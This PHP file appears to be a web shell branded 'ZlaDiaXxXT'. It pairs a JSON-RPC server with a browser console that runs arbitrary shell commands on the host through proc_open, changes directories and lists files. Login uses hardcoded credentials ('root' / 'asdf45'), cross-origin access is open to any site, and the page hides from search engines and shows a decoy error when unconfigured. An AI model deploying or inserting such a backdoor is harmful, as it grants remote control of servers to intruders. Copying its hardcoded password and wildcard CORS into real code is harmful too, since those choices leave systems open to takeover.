<?php
$USER = 'root';
$PASSWORD = 'asdf45';

// Multi-user credentials
// Example: $ACCOUNTS = array('user1' => 'password1', 'user2' => 'password2');
$ACCOUNTS = array();

$HOME_DIRECTORY = '/home';

?>
<?php
    class BaseJsonRpcServer {

        const ParseError     = -32700;

        const InvalidRequest = -32600;

        const MethodNotFound = -32601;

        const InvalidParams  = -32602;

        const InternalError  = -32603;

        /**
         * Exposed Instance
         * @var object
         */
        protected $instance;

        /**
         * Decoded Json Request
         * @var object|array
         */
        protected $request;

        /**
         * Array of Received Calls
         * @var array
         */
        protected $calls = array();

        /**
         * Array of Responses for Calls
         * @var array
         */
        protected $response = array();

        /**
         * Has Calls Flag (not notifications)
         * @var bool
         */
        protected $hasCalls = false;

        /**
         * Is Batch Call in using
         * @var bool
         */
        private $isBatchCall = false;

        /**
         * Hidden Methods
         * @var array
         */
        protected $hiddenMethods = array(
            'execute', '__construct'
        );

        /**
         * Content Type
         * @var string
         */
        public $ContentType = 'application/json';

        /**
         * Alow Cross-Domain Requests
         * @var bool
         */
        public $IsXDR = true;

        /**
         * Error Messages
         * @var array
         */
        protected $errorMessages = array(
            self::ParseError       => 'Parse error'
            , self::InvalidRequest => 'Invalid Request'
            , self::MethodNotFound => 'Method not found'
            , self::InvalidParams  => 'Invalid params'
            , self::InternalError  => 'Internal error'
        );


        /**
         * Cached Reflection Methods
         * @var ReflectionMethod[]
         */
        private $reflectionMethods = array();

        /**
         * Validate Request
         * @return int error
         */
        private function getRequest() {
            $error = null;

            do {
                if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) && $_SERVER['REQUEST_METHOD'] != 'POST' ) {
                    $error = self::InvalidRequest;
                    break;
                };

                $request       = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
                $this->request = json_decode( $request, false );
                if ( $this->request === null ) {
                    $error = self::ParseError;
                    break;
                }

                if ( $this->request === array() ) {
                    $error = self::InvalidRequest;
                    break;
                }

                // check for batch call
                if ( is_array( $this->request ) ) {
                    $this->calls       = $this->request;
                    $this->isBatchCall = true;
                } else {
                    $this->calls[] = $this->request;
                }
            } while ( false );

            return $error;
        }


        /**
         * Get Error Response
         * @param int   $code
         * @param mixed $id
         * @param null  $data
         * @return array
         */
        private function getError( $code, $id = null, $data = null ) {
            return array(
                'jsonrpc' => '2.0'
                , 'error' => array(
                    'code'      => $code
                    , 'message' => isset( $this->errorMessages[$code] ) ? $this->errorMessages[$code] : $this->errorMessages[self::InternalError]
                    , 'data'    => $data
                )
                , 'id' => $id
            );
        }


        /**
         * Check for jsonrpc version and correct method
         * @param object $call
         * @return array|null
         */
        private function validateCall( $call ) {
            $result = null;
            $error  = null;
            $data   = null;
            $id     = is_object( $call ) && property_exists( $call, 'id' ) ? $call->id : null;
            do {
                if ( !is_object( $call ) ) {
                    $error = self::InvalidRequest;
                    break;
                }


                if ( property_exists( $call, 'version' ) ) {
                    if ( $call->version == 'json-rpc-2.0' ) {
                        $call->jsonrpc = '2.0';
                    }
                }

                if ( !property_exists( $call, 'jsonrpc' ) || $call->jsonrpc != '2.0' ) {
                    $error = self::InvalidRequest;
                    break;
                }

                $method = property_exists( $call, 'method' ) ? $call->method : null;
                if ( !$method || !method_exists( $this->instance, $method ) || in_array( strtolower( $method ), $this->hiddenMethods ) ) {
                    $error = self::MethodNotFound;
                    break;
                }

                if ( !array_key_exists( $method, $this->reflectionMethods ) ) {
                    $this->reflectionMethods[$method] = new ReflectionMethod( $this->instance, $method );
                }

                /** @var $params array */
                $params     = property_exists( $call, 'params' ) ? $call->params: null;
                $paramsType = gettype( $params );
                if ( $params !== null && $paramsType != 'array' && $paramsType != 'object' ) {
                    $error = self::InvalidParams;
                    break;
                }


                switch( $paramsType ) {
                    case 'array':
                        $totalRequired = 0;

                        foreach( $this->reflectionMethods[$method]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable() ) {
                                $totalRequired ++;
                            }
                        }

                        if ( count( $params ) < $totalRequired ) {
                            $error = self::InvalidParams;
                            $data  = sprintf( 'Check Numbers Of Required Params (Got %d, Expected %d)', count( $params ), $totalRequired  );
                        }
                        break;
                    case 'object':
                        foreach( $this->reflectionMethods[$method]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable()  && !array_key_exists( $param->getName(), $params ) ) {
                                $error = self::InvalidParams;
                                $data  = $param->getName() . ' Not Found';

                                break 3;
                            }
                        }
                        break;
                    case 'NULL':
                        if ( $this->reflectionMethods[$method]->getNumberOfRequiredParameters() > 0  ) {
                            $error = self::InvalidParams;
                            $data  = 'Empty Required Params';
                            break 2;
                        }
                        break;
                }

            } while( false );

            if ( $error ) {
                $result = array( $error, $id, $data );
            }

            return $result;
        }


        /**
         * Process Call
         * @param $call
         * @return array|null
         */
        private function processCall( $call ) {
            $id     = property_exists( $call, 'id' ) ? $call->id : null;
            $params = property_exists( $call, 'params' ) ? $call->params : array();
            $result = null;

            try {
                // set named parameters
                if ( is_object( $params ) ) {
                    $newParams = array();
                    foreach($this->reflectionMethods[$call->method]->getParameters() as $param) {
                        $paramName    = $param->getName();
                        $defaultValue = $param->isDefaultValueAvailable() ? $param->getDefaultValue() : null;
                        $newParams[]  = property_exists( $params, $paramName ) ? $params->$paramName : $defaultValue;
                    }

                    $params = $newParams;
                }

                // invoke
                $result = $this->reflectionMethods[$call->method]->invokeArgs( $this->instance, $params );
            } catch ( Exception $e ) {
                return $this->getError( $e->getCode(), $id, $e->getMessage() );
            }

            if ( !$id ) {
                return null;
            }

            return array(
                'jsonrpc'  => '2.0'
                , 'result' => $result
                , 'id'     => $id
            );
        }


        /**
         * Create new Instance
         * @param object $instance
         */
        public function __construct( $instance = null ) {
            if ( get_parent_class( $this ) ) {
                $this->instance = $this;
            } else {
                $this->instance = $instance;
                $this->instance->errorMessages = $this->errorMessages;
            }
        }


        /**
         * Handle Requests
         */
        public function Execute() {
            do {
                // check for SMD Discovery request
                if ( array_key_exists( 'smd', $_GET ) ) {
                    $this->response[]   = $this->getServiceMap();
                    $this->hasCalls    = true;
                    break;
                }

                $error = $this->getRequest();
                if ( $error ) {
                    $this->response[] = $this->getError( $error );
                    $this->hasCalls   = true;
                    break;
                }

                foreach( $this->calls as $call ) {
                    $error = $this->validateCall( $call );
                    if ( $error ) {
                        $this->response[] = $this->getError( $error[0], $error[1], $error[2] );
                        $this->hasCalls   = true;
                    } else {
                        $result = $this->processCall( $call );
                        if ( $result ) {
                            $this->response[] = $result;
                            $this->hasCalls   = true;
                        }
                    }
                }
            } while( false );

            // flush response
            if ( $this->hasCalls ) {
                if ( !$this->isBatchCall ) {
                    $this->response = reset( $this->response );
                }

                // Set Content Type
                if ( $this->ContentType ) {
                    header( 'Content-Type: '. $this->ContentType );
                }

                // Allow Cross Domain Requests
                if ( $this->IsXDR ) {
                    header( 'Access-Control-Allow-Origin: *' );
                    header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
                }

                echo json_encode( $this->response );
                $this->resetVars();
            }
        }


        /**
         * Get Doc Comment
         * @param $comment
         * @return string|null
         */
        private function getDocDescription( $comment ) {
            $result = null;
            if (  preg_match('/\*\s+([^@]*)\s+/s', $comment, $matches ) ) {
                $result = str_replace( '*' , "\n", trim( trim( $matches[1], '*' ) ) );
            }

            return $result;
        }


        /**
         * Get Service Map
         * Maybe not so good realization of auto-discover via doc blocks
         * @return array
         */
        private function getServiceMap() {
            $rc     = new ReflectionClass( $this->instance );
            $result = array(
                'transport'     => 'POST'
                , 'envelope'    => 'JSON-RPC-2.0'
                , 'SMDVersion'  => '2.0'
                , 'contentType' => 'application/json'
                , 'target'      => !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0,strpos( $_SERVER['REQUEST_URI'], '?') ) : ''
                , 'services'    => array()
                , 'description' => ''
            );

            // Get Class Description
            if ( $rcDocComment = $this->getDocDescription( $rc->getDocComment()) ) {
                $result['description'] = $rcDocComment;
            }

            foreach( $rc->getMethods() as $method ) {
                /** @var ReflectionMethod $method */
                if ( !$method->isPublic() || in_array( strtolower( $method->getName() ), $this->hiddenMethods ) ) {
                    continue;
                }

                $methodName = $method->getName();
                $docComment = $method->getDocComment();

                $result['services'][$methodName] = array( 'parameters' => array() );

                // set description
                if ( $rmDocComment = $this->getDocDescription( $docComment ) ) {
                    $result['services'][$methodName]['description'] = $rmDocComment;
                }

                // @param\s+([^\s]*)\s+([^\s]*)\s*([^\s\*]*)
                $parsedParams = array();
                if ( preg_match_all('/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) {
                    foreach( $matches[2] as $number => $name ) {
                        $type = $matches[1][$number];
                        $desc = $matches[3][$number];
                        $name = trim( $name, '$' );

                        $param = array( 'type' => $type, 'description' => $desc );
                        $parsedParams[$name] = array_filter( $param );
                    }
                };

                // process params
                foreach ( $method->getParameters() as $parameter ) {
                    $name  = $parameter->getName();
                    $param = array( 'name' => $name, 'optional' => $parameter->isDefaultValueAvailable() );
                    if ( array_key_exists( $name, $parsedParams ) ) {
                        $param += $parsedParams[$name];
                    }

                    if ( $param['optional'] ) {
                        $param['default']  = $parameter->getDefaultValue();
                    }

                    $result['services'][$methodName]['parameters'][] = $param;
                }

                // set return type
                if ( preg_match('/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) {
                    $returns = array( 'type' => $matches[1], 'description' => trim( $matches[2] ) );
                    $result['services'][$methodName]['returns'] = array_filter( $returns );
                }
            }

            return $result;
        }


        /**
         * Reset Local Class Vars after Execute
         */
        private function resetVars() {
            $this->response = $this->calls = array();
            $this->hasCalls = $this->isBatchCall = false;
        }

    }

?>
<?php
// Initializing
if (!isset($ACCOUNTS)) $ACCOUNTS = array();
if (isset($USER) && isset($PASSWORD) && $USER && $PASSWORD) $ACCOUNTS[$USER] = $PASSWORD;
if (!isset($HOME_DIRECTORY)) $HOME_DIRECTORY = '';
$IS_CONFIGURED = count($ACCOUNTS) >= 1 ? true : false;

// Command execution
function execute_command($command) {
    $descriptors = array(
        0 => array('pipe', 'r'), // STDIN
        1 => array('pipe', 'w'), // STDOUT
        2 => array('pipe', 'w')  // STDERR
    );

    $process = proc_open($command . ' 2>&1', $descriptors, $pipes);
    if (!is_resource($process)) die("Can't Execute Command...");

    // Nothing to push to STDIN
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // All pipes must be closed before "proc_close"
    $code = proc_close($process);

    return $output;
}

// Command parsing
function parse_command($command) {
    $value = ltrim((string) $command);

    if ($value && !empty($value)) {
        $values = explode(' ', $value);
        $values_total = count($values);

        if ($values_total > 1) {
            $value = $values[$values_total - 1];

            for ($index = $values_total - 2; $index >= 0; $index--) {
                $value_item = $values[$index];

                if (substr($value_item, -1) == '\\')
                    $value = $value_item . ' ' . $value;
                else break;
            }
        }
    }

    return $value;
}

// RPC Server
class WebConsoleRPCServer extends BaseJsonRpcServer {
    protected $home_directory = '';

    private function error($message) {
        throw new Exception($message);
    }

    // Authentication
    private function password_hash($password) {
        return hash('sha256', trim((string) $password));
    }

    private function authenticate_user($user, $password) {
        $user = trim((string) $user);
        $password = trim((string) $password);

        if ($user && $password) {
            global $ACCOUNTS;

            if (isset($ACCOUNTS[$user]) && $ACCOUNTS[$user] && strcmp($password, $ACCOUNTS[$user]) == 0)
                return $user . ':' . $this->password_hash($password);
        }

        throw new Exception("Incorrect User or Password..");
    }

    private function authenticate_token($token) {
        $token = trim((string) $token);
        $token_parts = explode(':', $token, 2);

        if (count($token_parts) == 2) {
            $user = trim((string) $token_parts[0]);
            $password_hash = trim((string) $token_parts[1]);

            if ($user && $password_hash) {
                global $ACCOUNTS;

                if (isset($ACCOUNTS[$user]) && $ACCOUNTS[$user]) {
                    $real_password_hash = $this->password_hash($ACCOUNTS[$user]);

                    if (strcmp($password_hash, $real_password_hash) == 0)
                        return true;
                }
            }
        }

        throw new Exception("Incorrect User or Password..");
    }

    // Environment
    private function get_environment() {
        $hostname = function_exists('gethostname') ? gethostname() : null;
        return array('path' => getcwd(), 'hostname' => $hostname);
    }

    private function set_environment($environment) {
        if ($environment && !empty($environment)) {
            $environment = (array) $environment;

            if (isset($environment['path']) && $environment['path']) {
                $path = $environment['path'];

                if (is_dir($path)) {
                    if (!@chdir($path)) return array('output' => "Unable To Change Dir To Current Working Dir, UPD..",
                                                     'environment' => $this->get_environment());
                }
                else return array('output' => "Current Working Dir Not Found! UPD...",
                                  'environment' => $this->get_environment());
            }
        }
    }

    // Initialization
    private function initialize($token, $environment) {
        $this->authenticate_token($token);

        global $HOME_DIRECTORY;
        $this->home_directory = !empty($HOME_DIRECTORY) ? $HOME_DIRECTORY : getcwd();
        $result = $this->set_environment($environment);

        if ($result) return $result;
    }

    // Methods
    public function login($user, $password) {
        $result = array('token' => $this->authenticate_user($user, $password),
                        'environment' => $this->get_environment());

        global $HOME_DIRECTORY;
        if (!empty($HOME_DIRECTORY)) {
            if (is_dir($HOME_DIRECTORY))
                $result['environment']['path'] = $HOME_DIRECTORY;
            else $result['output'] = "Home Dir Not Found: ". $HOME_DIRECTORY;
        }

        return $result;
    }

    public function cd($token, $environment, $path) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $path = trim((string) $path);
        if (empty($path)) $path = $this->home_directory;

        if (!empty($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "cd: ". $path . ": Unable To Change Dir");
            }
            else return array('output' => "cd: ". $path . ": No Such Dir");
        }

        return array('environment' => $this->get_environment());
    }

    public function completion($token, $environment, $pattern, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $scan_path = '';
        $completion_prefix = '';
        $completion = array();

        if (!empty($pattern)) {
            if (!is_dir($pattern)) {
                $pattern = dirname($pattern);
                if ($pattern == '.') $pattern = '';
            }

            if (!empty($pattern)) {
                if (is_dir($pattern)) {
                    $scan_path = $completion_prefix = $pattern;
                    if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
                }
            }
            else $scan_path = getcwd();
        }
        else $scan_path = getcwd();

        if (!empty($scan_path)) {
            // Loading directory listing
            $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
            natsort($completion);

            // Prefix
            if (!empty($completion_prefix) && !empty($completion)) {
                foreach ($completion as &$value) $value = $completion_prefix . $value;
            }

            // Pattern
            if (!empty($pattern) && !empty($completion)) {
                // For PHP version that does not support anonymous functions (available since PHP 5.3.0)
                function filter_pattern($value) {
                    global $pattern;
                    return !strncmp($pattern, $value, strlen($pattern));
                }

                $completion = array_values(array_filter($completion, 'filter_pattern'));
            }
        }

        return array('completion' => $completion);
    }

    public function run($token, $environment, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $output = ($command && !empty($command)) ? execute_command($command) : '';
        if ($output && substr($output, -1) == "\n") $output = substr($output, 0, -1);

        return array('output' => $output);
    }
}

// Processing request
if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $rpc_server = new WebConsoleRPCServer();
    $rpc_server->Execute();
}
else if (!$IS_CONFIGURED) {
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>ZlaDiaXxXT</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="description" content="ZlaDiaXxXT" />
        <meta name="author" content="ZlaDiaXxX" />
        <meta name="robots" content="none" />
        <link rel="stylesheet" href="main.css" type="text/css" />
    </head>
    <body>
        <div class="configure">
            <p>Something Whent Wrong!:</p>
            <ul>
                <li>Report It To Owner!.</li>
            </ul>
            <p>For more information visit <a href="http://www.github.com/zladiax">Github</a>.</p>
        </div>
    </body>
</html>
<?php
}
else { ?>
<!DOCTYPE html>
<html class="no-js">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>ZlaDiaXxXT</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="none" />
        <script src="main.js"></script>
        <link rel="stylesheet" href="other.css" type="text/css" />
    </head>
    <body>
<canvas style="position: absolute" id="c" height="655" width="1366"></canvas>
<script src="matrix.js"></script>
<!--div style="margin: 0 auto; width: 1000px; height: auto;"><div style="position: absolute; width: 1000px; height: auto; top: 50px; margin: 0 auto;"-->
    </body>
</html>
<?php } ?>